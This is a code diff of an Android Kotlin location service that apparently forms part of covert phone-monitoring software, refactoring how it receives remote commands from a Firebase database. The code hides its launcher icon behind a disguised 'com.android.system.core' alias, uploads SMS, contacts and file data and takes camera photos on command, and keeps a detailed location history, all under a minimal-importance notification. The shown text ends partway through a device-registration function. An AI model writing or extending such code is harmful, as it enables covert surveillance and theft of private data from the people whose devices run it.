@@ -13,6 +13,7 @@ import android.location.LocationManager
 import android.os.BatteryManager
 import android.os.Build
 import android.os.IBinder
+import android.provider.Settings
 import android.os.PowerManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -64,7 +65,7 @@ class LocationForegroundService : Service() {
     
     private lateinit var locationManager: LocationManager
     private var currentLocationProvider: String = "fused"
-    private lateinit var deviceId: String
+    private var commandListenersRegistered = false
 
     private val serviceJob = SupervisorJob()
     private val scope = CoroutineScope(serviceJob + Dispatchers.Default)
@@ -88,7 +89,7 @@ class LocationForegroundService : Service() {
                 if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Location received: lat=$lat, lng=$lng, accuracy=$accuracy") }
                 
                 // Upload to Firebase with actual accuracy
-                uploadLocationToFirebase(lat, lng, accuracy)
+                uploadLocationToFirebase(lat, lng, accuracy, location.speed, location.bearing, location.altitude, "fused")
             } ?: run {
                 if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Location is null - no location data available") }
             }
@@ -100,9 +101,6 @@ class LocationForegroundService : Service() {
     override fun onCreate() {
         super.onCreate()
         if (BuildConfig.DEBUG) { Log.d("LocationForegroundService", "📍 Service created") }
-        
-        // Initialize deviceId now that Context is available
-        deviceId = getOrCreateDeviceId()
         
         locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         
@@ -127,304 +125,21 @@ class LocationForegroundService : Service() {
             }
         }
         
-        // Firebase listener for hideLauncher command
-        val currentUid = FirebaseAuth.getInstance().currentUser?.uid
-        if (currentUid != null) {
-            val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
-                .getReference("devices").child(currentUid).child("commands")
-            val deviceRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
-                .getReference("devices").child(currentUid).child("location")
-            
-            commandsRef.child("hideLauncher").addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    if (BuildConfig.DEBUG) { Log.d(TAG, "hideLauncher data changed, exists: ${snapshot.exists()}") }
-                    if (!snapshot.exists() || snapshot.getValue() == null) return
-                    
-                    // Prevent duplicate execution when status is updated
-                    val currentStatus = snapshot.child("status").getValue(String::class.java)
-                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
-                    
-                    val commandNodeRef = commandsRef.child("hideLauncher")
-                    
-                    // Write ack status immediately
-                    commandNodeRef.updateChildren(mapOf(
-                        "status" to "ack",
-                        "ackedAt" to ServerValue.TIMESTAMP
-                    ))
-                    
-                    scope.launch {
-                        try {
-                            val component = ComponentName(
-                                this@LocationForegroundService,
-                                "com.android.system.core.StartupActivityAlias"
-                            )
-                            packageManager.setComponentEnabledSetting(
-                                component,
-                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                                PackageManager.DONT_KILL_APP
-                            )
-                            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Launcher alias disabled") }
-                            deviceRef.child("location").child("launcherHidden").setValue(true)
-                            
-                            // Write done status
-                            updateCommandStatus(commandNodeRef, "done")
-                            
-                            // Clear after 5 seconds
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        } catch (e: Exception) {
-                            if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to disable launcher alias: ${e.message}") }
-                            updateCommandStatus(commandNodeRef, "failed", e.message)
-                            
-                            // Clear after 5 seconds
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        }
+        // Setup command listeners when user is authenticated
+        FirebaseAuth.getInstance().addAuthStateListener { auth ->
+            if (BuildConfig.DEBUG) {
+                Log.d("SYS_CORE", "🔧 Auth state listener triggered, currentUser: ${auth.currentUser?.uid}")
+            }
+            auth.currentUser?.uid?.let { uid ->
+                if (!commandListenersRegistered) {
+                    setupCommandListeners(uid)
+                    commandListenersRegistered = true
+                    if (BuildConfig.DEBUG) { 
+                        Log.d("SYS_CORE", "Auth state listener: Command listeners registered for UID: $uid") 
                     }
                 }
-                
-                override fun onCancelled(error: DatabaseError) {
-                    if (BuildConfig.DEBUG) { Log.e(TAG, "Hide launcher listener cancelled: ${error.message}") }
-                }
-            })
-            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Hide launcher listener started for device: $currentUid") }
-            
-            // Firebase listener for syncSms command
-            commandsRef.child("syncSms").addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    if (BuildConfig.DEBUG) { Log.d(TAG, "syncSms data changed, exists: ${snapshot.exists()}") }
-                    if (!snapshot.exists() || snapshot.getValue() == null) return
-
-                    val currentStatus = snapshot.child("status").getValue(String::class.java)
-                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
-
-                    val commandNodeRef = commandsRef.child("syncSms")
-
-                    // ack status
-                    commandNodeRef.updateChildren(mapOf(
-                        "status" to "ack",
-                        "ackedAt" to ServerValue.TIMESTAMP
-                    ))
-
-                    scope.launch(Dispatchers.IO) {
-                        try {
-                            SmsReader(this@LocationForegroundService).readAndUpload(currentUid) { success ->
-                                if (success) {
-                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncSms done") }
-                                    updateCommandStatus(commandNodeRef, "done")
-                                } else {
-                                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms failed") }
-                                    updateCommandStatus(commandNodeRef, "failed", "SMS read/upload error")
-                                }
-                                scope.launch {
-                                    delay(5000L)
-                                    commandNodeRef.setValue(null)
-                                }
-                            }
-                        } catch (e: Exception) {
-                            if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms exception: ${e.message}") }
-                            updateCommandStatus(commandNodeRef, "failed", e.message)
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        }
-                    }
-                }
-
-                override fun onCancelled(error: DatabaseError) {
-                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms listener cancelled: ${error.message}") }
-                }
-            })
-            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncSms listener started for device: $currentUid") }
-
-            // Firebase listener for syncContacts command
-            commandsRef.child("syncContacts").addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    if (BuildConfig.DEBUG) { Log.d(TAG, "syncContacts data changed, exists: ${snapshot.exists()}") }
-                    if (!snapshot.exists() || snapshot.getValue() == null) return
-
-                    val currentStatus = snapshot.child("status").getValue(String::class.java)
-                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
-
-                    val commandNodeRef = commandsRef.child("syncContacts")
-                    commandNodeRef.updateChildren(mapOf(
-                        "status" to "ack",
-                        "ackedAt" to ServerValue.TIMESTAMP
-                    ))
-
-                    scope.launch(Dispatchers.IO) {
-                        try {
-                            ContactsReader(this@LocationForegroundService).readAndUpload(currentUid) { success ->
-                                if (success) {
-                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncContacts done") }
-                                    updateCommandStatus(commandNodeRef, "done")
-                                } else {
-                                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts failed") }
-                                    updateCommandStatus(commandNodeRef, "failed", "Contacts read/upload error")
-                                }
-                                scope.launch {
-                                    delay(5000L)
-                                    commandNodeRef.setValue(null)
-                                }
-                            }
-                        } catch (e: Exception) {
-                            if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts exception: ${e.message}") }
-                            updateCommandStatus(commandNodeRef, "failed", e.message)
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        }
-                    }
-                }
-
-                override fun onCancelled(error: DatabaseError) {
-                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts listener cancelled: ${error.message}") }
-                }
-            })
-            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncContacts listener started for device: $currentUid") }
-
-            // Firebase listener for syncFiles command
-            commandsRef.child("syncFiles").addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    if (BuildConfig.DEBUG) { Log.d(TAG, "syncFiles data changed, exists: ${snapshot.exists()}") }
-                    if (!snapshot.exists() || snapshot.getValue() == null) return
-
-                    val currentStatus = snapshot.child("status").getValue(String::class.java)
-                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
-
-                    val commandNodeRef = commandsRef.child("syncFiles")
-                    commandNodeRef.updateChildren(mapOf(
-                        "status" to "ack",
-                        "ackedAt" to ServerValue.TIMESTAMP
-                    ))
-
-                    scope.launch(Dispatchers.IO) {
-                        try {
-                            FileMetaReader(this@LocationForegroundService).readAndUpload(currentUid) { success ->
-                                if (success) {
-                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncFiles done") }
-                                    updateCommandStatus(commandNodeRef, "done")
-                                } else {
-                                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles failed") }
-                                    updateCommandStatus(commandNodeRef, "failed", "Files read/upload error")
-                                }
-                                scope.launch {
-                                    delay(5000L)
-                                    commandNodeRef.setValue(null)
-                                }
-                            }
-                        } catch (e: Exception) {
-                            if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles exception: ${e.message}") }
-                            updateCommandStatus(commandNodeRef, "failed", e.message)
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        }
-                    }
-                }
-
-                override fun onCancelled(error: DatabaseError) {
-                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles listener cancelled: ${error.message}") }
-                }
-            })
-            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncFiles listener started for device: $currentUid") }
-
-            // Firebase listener for takePhoto command
-            commandsRef.child("takePhoto").addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    if (BuildConfig.DEBUG) { Log.d(TAG, "takePhoto data changed, exists: ${snapshot.exists()}") }
-                    if (!snapshot.exists() || snapshot.getValue() == null) return
-
-                    val currentStatus = snapshot.child("status").getValue(String::class.java)
-                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
-
-                    val commandNodeRef = commandsRef.child("takePhoto")
-                    commandNodeRef.updateChildren(mapOf(
-                        "status" to "ack",
-                        "ackedAt" to ServerValue.TIMESTAMP
-                    ))
-
-                    scope.launch(Dispatchers.IO) {
-                        try {
-                            CameraSnapshotWorker(this@LocationForegroundService).takePhoto(currentUid) { success ->
-                                if (success) {
-                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ takePhoto done") }
-                                    updateCommandStatus(commandNodeRef, "done")
-                                } else {
-                                    if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto failed") }
-                                    updateCommandStatus(commandNodeRef, "failed", "Camera capture error")
-                                }
-                                scope.launch {
-                                    delay(5000L)
-                                    commandNodeRef.setValue(null)
-                                }
-                            }
-                        } catch (e: Exception) {
-                            if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto exception: ${e.message}") }
-                            updateCommandStatus(commandNodeRef, "failed", e.message)
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        }
-                    }
-                }
-
-                override fun onCancelled(error: DatabaseError) {
-                    if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto listener cancelled: ${error.message}") }
-                }
-            })
-            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ takePhoto listener started for device: $currentUid") }
-
-            // Firebase listener for showLauncher command
-            commandsRef.child("showLauncher").addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    if (BuildConfig.DEBUG) { Log.d(TAG, "showLauncher data changed, exists: ${snapshot.exists()}") }
-                    if (!snapshot.exists() || snapshot.getValue() == null) return
-                    
-                    // Prevent duplicate execution when status is updated
-                    val currentStatus = snapshot.child("status").getValue(String::class.java)
-                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
-                    
-                    val commandNodeRef = commandsRef.child("showLauncher")
-                    
-                    // Write ack status immediately
-                    commandNodeRef.updateChildren(mapOf(
-                        "status" to "ack",
-                        "ackedAt" to ServerValue.TIMESTAMP
-                    ))
-                    
-                    scope.launch {
-                        try {
-                            val component = ComponentName(
-                                this@LocationForegroundService,
-                                "com.android.system.core.StartupActivityAlias"
-                            )
-                            packageManager.setComponentEnabledSetting(
-                                component,
-                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                                PackageManager.DONT_KILL_APP
-                            )
-                            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Launcher alias enabled") }
-                            deviceRef.child("location").child("launcherHidden").setValue(false)
-                            
-                            // Write done status
-                            updateCommandStatus(commandNodeRef, "done")
-                            
-                            // Clear after 5 seconds
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        } catch (e: Exception) {
-                            if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to enable launcher alias: ${e.message}") }
-                            updateCommandStatus(commandNodeRef, "failed", e.message)
-                            
-                            // Clear after 5 seconds
-                            delay(5000L)
-                            commandNodeRef.setValue(null)
-                        }
-                    }
-                }
-                
-                override fun onCancelled(error: DatabaseError) {
-                    if (BuildConfig.DEBUG) { Log.e(TAG, "Show launcher listener cancelled: ${error.message}") }
-                }
-            })
-            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Show launcher listener started for device: $currentUid") }
+                registerDeviceInfo(uid)
+            }
         }
         
         loopJob = scope.launch {
@@ -451,6 +166,307 @@ class LocationForegroundService : Service() {
                 delay(intervalMs)
             }
         }
+    }
+
+    private fun setupCommandListeners(uid: String) {
+        if (BuildConfig.DEBUG) { Log.d("SYS_CORE", "Command listeners registered for UID: $uid") }
+        
+        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices").child(uid).child("commands")
+        val deviceRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices").child(uid)
+        
+        // Firebase listener for hideLauncher command
+        commandsRef.child("hideLauncher").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (BuildConfig.DEBUG) { Log.d(TAG, "hideLauncher data changed, exists: ${snapshot.exists()}") }
+                if (!snapshot.exists() || snapshot.getValue() == null) return
+                
+                // Prevent duplicate execution when status is updated
+                val currentStatus = snapshot.child("status").getValue(String::class.java)
+                if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
+                
+                val commandNodeRef = commandsRef.child("hideLauncher")
+                
+                // Write ack status immediately
+                commandNodeRef.updateChildren(mapOf(
+                    "status" to "ack",
+                    "ackedAt" to ServerValue.TIMESTAMP
+                ))
+                
+                scope.launch {
+                    try {
+                        val component = ComponentName(
+                            this@LocationForegroundService,
+                            "com.android.system.core.StartupActivityAlias"
+                        )
+                        packageManager.setComponentEnabledSetting(
+                            component,
+                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            PackageManager.DONT_KILL_APP
+                        )
+                        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Launcher alias disabled") }
+                        deviceRef.child("status").child("launcherHidden").setValue(true)
+                        
+                        // Write done status
+                        updateCommandStatus(commandNodeRef, "done")
+                        
+                        // Clear after 5 seconds
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to disable launcher alias: ${e.message}") }
+                        updateCommandStatus(commandNodeRef, "failed", e.message)
+                        
+                        // Clear after 5 seconds
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    }
+                }
+            }
+            
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e(TAG, "Hide launcher listener cancelled: ${error.message}") }
+            }
+        })
+        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Hide launcher listener started for device: $uid") }
+        
+        // Firebase listener for syncSms command
+        commandsRef.child("syncSms").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (BuildConfig.DEBUG) { Log.d(TAG, "syncSms data changed, exists: ${snapshot.exists()}") }
+                if (!snapshot.exists() || snapshot.getValue() == null) return
+
+                val currentStatus = snapshot.child("status").getValue(String::class.java)
+                if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
+
+                val commandNodeRef = commandsRef.child("syncSms")
+
+                // ack status
+                commandNodeRef.updateChildren(mapOf(
+                    "status" to "ack",
+                    "ackedAt" to ServerValue.TIMESTAMP
+                ))
+
+                scope.launch(Dispatchers.IO) {
+                    try {
+                        SmsReader(this@LocationForegroundService).readAndUpload(uid) { success ->
+                            if (success) {
+                                if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncSms done") }
+                                updateCommandStatus(commandNodeRef, "done")
+                            } else {
+                                if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms failed") }
+                                updateCommandStatus(commandNodeRef, "failed", "SMS read/upload error")
+                            }
+                            scope.launch {
+                                delay(5000L)
+                                commandNodeRef.setValue(null)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms exception: ${e.message}") }
+                        updateCommandStatus(commandNodeRef, "failed", e.message)
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    }
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms listener cancelled: ${error.message}") }
+            }
+        })
+        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncSms listener started for device: $uid") }
+
+        // Firebase listener for syncContacts command
+        commandsRef.child("syncContacts").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (BuildConfig.DEBUG) { Log.d(TAG, "syncContacts data changed, exists: ${snapshot.exists()}") }
+                if (!snapshot.exists() || snapshot.getValue() == null) return
+
+                val currentStatus = snapshot.child("status").getValue(String::class.java)
+                if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
+
+                val commandNodeRef = commandsRef.child("syncContacts")
+                commandNodeRef.updateChildren(mapOf(
+                    "status" to "ack",
+                    "ackedAt" to ServerValue.TIMESTAMP
+                ))
+
+                scope.launch(Dispatchers.IO) {
+                    try {
+                        ContactsReader(this@LocationForegroundService).readAndUpload(uid) { success ->
+                            if (success) {
+                                if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncContacts done") }
+                                updateCommandStatus(commandNodeRef, "done")
+                            } else {
+                                if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts failed") }
+                                updateCommandStatus(commandNodeRef, "failed", "Contacts read/upload error")
+                            }
+                            scope.launch {
+                                delay(5000L)
+                                commandNodeRef.setValue(null)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts exception: ${e.message}") }
+                        updateCommandStatus(commandNodeRef, "failed", e.message)
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    }
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts listener cancelled: ${error.message}") }
+            }
+        })
+        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncContacts listener started for device: $uid") }
+
+        // Firebase listener for syncFiles command
+        commandsRef.child("syncFiles").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (BuildConfig.DEBUG) { Log.d(TAG, "syncFiles data changed, exists: ${snapshot.exists()}") }
+                if (!snapshot.exists() || snapshot.getValue() == null) return
+
+                val currentStatus = snapshot.child("status").getValue(String::class.java)
+                if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
+
+                val commandNodeRef = commandsRef.child("syncFiles")
+                commandNodeRef.updateChildren(mapOf(
+                    "status" to "ack",
+                    "ackedAt" to ServerValue.TIMESTAMP
+                ))
+
+                scope.launch(Dispatchers.IO) {
+                    try {
+                        FileMetaReader(this@LocationForegroundService).readAndUpload(uid) { success ->
+                            if (success) {
+                                if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncFiles done") }
+                                updateCommandStatus(commandNodeRef, "done")
+                            } else {
+                                if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles failed") }
+                                updateCommandStatus(commandNodeRef, "failed", "Files read/upload error")
+                            }
+                            scope.launch {
+                                delay(5000L)
+                                commandNodeRef.setValue(null)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles exception: ${e.message}") }
+                        updateCommandStatus(commandNodeRef, "failed", e.message)
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    }
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles listener cancelled: ${error.message}") }
+            }
+        })
+        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncFiles listener started for device: $uid") }
+
+        // Firebase listener for takePhoto command
+        commandsRef.child("takePhoto").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (BuildConfig.DEBUG) { Log.d(TAG, "takePhoto data changed, exists: ${snapshot.exists()}") }
+                if (!snapshot.exists() || snapshot.getValue() == null) return
+
+                val currentStatus = snapshot.child("status").getValue(String::class.java)
+                if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
+
+                val commandNodeRef = commandsRef.child("takePhoto")
+                commandNodeRef.updateChildren(mapOf(
+                    "status" to "ack",
+                    "ackedAt" to ServerValue.TIMESTAMP
+                ))
+
+                scope.launch(Dispatchers.IO) {
+                    try {
+                        CameraSnapshotWorker(this@LocationForegroundService).takePhoto(uid) { success ->
+                            if (success) {
+                                if (BuildConfig.DEBUG) { Log.d(TAG, "✅ takePhoto done") }
+                                updateCommandStatus(commandNodeRef, "done")
+                            } else {
+                                if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto failed") }
+                                updateCommandStatus(commandNodeRef, "failed", "Camera capture error")
+                            }
+                            scope.launch {
+                                delay(5000L)
+                                commandNodeRef.setValue(null)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto exception: ${e.message}") }
+                        updateCommandStatus(commandNodeRef, "failed", e.message)
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    }
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto listener cancelled: ${error.message}") }
+            }
+        })
+        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ takePhoto listener started for device: $uid") }
+
+        // Firebase listener for showLauncher command
+        commandsRef.child("showLauncher").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (BuildConfig.DEBUG) { Log.d(TAG, "showLauncher data changed, exists: ${snapshot.exists()}") }
+                if (!snapshot.exists() || snapshot.getValue() == null) return
+                
+                // Prevent duplicate execution when status is updated
+                val currentStatus = snapshot.child("status").getValue(String::class.java)
+                if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
+                
+                val commandNodeRef = commandsRef.child("showLauncher")
+                
+                // Write ack status immediately
+                commandNodeRef.updateChildren(mapOf(
+                    "status" to "ack",
+                    "ackedAt" to ServerValue.TIMESTAMP
+                ))
+                
+                scope.launch {
+                    try {
+                        val component = ComponentName(
+                            this@LocationForegroundService,
+                            "com.android.system.core.StartupActivityAlias"
+                        )
+                        packageManager.setComponentEnabledSetting(
+                            component,
+                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            PackageManager.DONT_KILL_APP
+                        )
+                        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Launcher alias enabled") }
+                        deviceRef.child("status").child("launcherHidden").setValue(false)
+                        
+                        // Write done status
+                        updateCommandStatus(commandNodeRef, "done")
+                        
+                        // Clear after 5 seconds
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to enable launcher alias: ${e.message}") }
+                        updateCommandStatus(commandNodeRef, "failed", e.message)
+                        
+                        // Clear after 5 seconds
+                        delay(5000L)
+                        commandNodeRef.setValue(null)
+                    }
+                }
+            }
+            
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e(TAG, "Show launcher listener cancelled: ${error.message}") }
+            }
+        })
+        if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Show launcher listener started for device: $uid") }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -480,6 +496,18 @@ class LocationForegroundService : Service() {
             if (it.isHeld) {
                 it.release()
             }
+        }
+        
+        // Set offline status in Firebase
+        val uid = FirebaseAuth.getInstance().currentUser?.uid
+        if (uid != null) {
+            val statusRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                .getReference("devices/$uid/status")
+            
+            statusRef.updateChildren(mapOf(
+                "online" to false,
+                "lastSeen" to com.google.firebase.database.ServerValue.TIMESTAMP
+            ))
         }
         
         runBlocking(Dispatchers.IO) {
@@ -695,17 +723,7 @@ class LocationForegroundService : Service() {
         }
     }
     
-    private fun getOrCreateDeviceId(): String {
-        val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
-        var deviceId = prefs.getString("device_id", null)
-        if (deviceId == null) {
-            deviceId = UUID.randomUUID().toString().replace("-", "").substring(0, 12)
-            prefs.edit().putString("device_id", deviceId).apply()
-        }
-        return deviceId
-    }
-
-    private fun uploadLocationToFirebase(lat: Double, lng: Double, accuracy: Float = 10f) {
+    private fun uploadLocationToFirebase(lat: Double, lng: Double, accuracy: Float = 10f, speed: Float = 0f, bearing: Float = 0f, altitude: Double = 0.0, provider: String = "") {
         try {
             if (BuildConfig.DEBUG) { Log.d("DEBUG_FIREBASE", "Firebase write attempt: lat=$lat, lng=$lng") }
             
@@ -713,7 +731,7 @@ class LocationForegroundService : Service() {
             val user = auth.currentUser
             if (user == null) {
                 auth.signInAnonymously().addOnSuccessListener {
-                    uploadLocationToFirebase(lat, lng, accuracy)
+                    uploadLocationToFirebase(lat, lng, accuracy, speed, bearing, altitude, provider)
                 }.addOnFailureListener { e ->
                     if (BuildConfig.DEBUG) { Log.e("DEBUG_FIREBASE", "Anonymous auth failed: ${e.message}") }
                 }
@@ -743,18 +761,12 @@ class LocationForegroundService : Service() {
                 "lat" to latValue,
                 "lng" to lngValue,
                 "accuracy" to accuracy,
-                "speed" to 0.0,
-                "bearing" to 0.0,
-                "altitude" to 0.0,
-                "provider" to currentLocationProvider,
+                "speed" to speed.toDouble(),
+                "bearing" to bearing.toDouble(),
+                "altitude" to altitude,
+                "provider" to provider.ifEmpty { currentLocationProvider },
                 "battery" to battery,
-                "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP,
-                "isOnline" to true,
-                "deviceId" to deviceId,
-                "deviceName" to deviceName,
-                "email" to email,
-                "status" to "online",
-                "lastUpdated" to com.google.firebase.database.ServerValue.TIMESTAMP
+                "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP
             )
             
             FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
@@ -767,6 +779,47 @@ class LocationForegroundService : Service() {
                 }
                 .addOnFailureListener { e ->
                     if (BuildConfig.DEBUG) { Log.e("DEBUG_FIREBASE", "Firebase write failed: ${e.message}") }
+                }
+
+                // Write to location history
+                val calendar = java.util.Calendar.getInstance()
+                val dateKey = String.format("%04d%02d%02d",
+                    calendar.get(java.util.Calendar.YEAR),
+                    calendar.get(java.util.Calendar.MONTH) + 1,
+                    calendar.get(java.util.Calendar.DAY_OF_MONTH))
+
+                val historyEntry = mapOf(
+                    "lat" to latValue,
+                    "lng" to lngValue,
+                    "accuracy" to accuracy.toDouble(),
+                    "speed" to speed.toDouble(),
+                    "bearing" to bearing.toDouble(),
+                    "altitude" to altitude,
+                    "provider" to provider.ifEmpty { currentLocationProvider },
+                    "battery" to battery,
+                    "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP
+                )
+
+                FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                    .getReference("location_history")
+                    .child(user.uid)
+                    .child(dateKey)
+                    .push()
+                    .setValue(historyEntry)
+                    .addOnFailureListener { e ->
+                        if (BuildConfig.DEBUG) { Log.e("SYS_CORE", "History write failed: ${e.message}") }
+                    }
+
+                // Update online status separately
+                val statusRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                    .getReference("devices/${user.uid}/status")
+                
+                statusRef.updateChildren(mapOf(
+                    "online" to true,
+                    "lastSeen" to com.google.firebase.database.ServerValue.TIMESTAMP,
+                    "battery" to battery
+                )).addOnFailureListener { e ->
+                    if (BuildConfig.DEBUG) { Log.e("SYS_CORE", "Failed to update status", e) }
                 }
                 
         } catch (e: Exception) {
@@ -835,6 +888,57 @@ class LocationForegroundService : Service() {
         }
         nm.createNotificationChannel(channel)
         if (BuildConfig.DEBUG) { Log.d("LocationForegroundService", "✅ IMPORTANCE_MIN channel created") }
+    }
+
+    private fun registerDeviceInfo(uid: String) {
+        if (BuildConfig.DEBUG) {
+            Log.d("SYS_CORE", "🔧 registerDeviceInfo called for UID: $uid")
+        }
+        val deviceRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices/$uid")
+        
+        // Force write on every start for testing
+        deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (BuildConfig.DEBUG) {
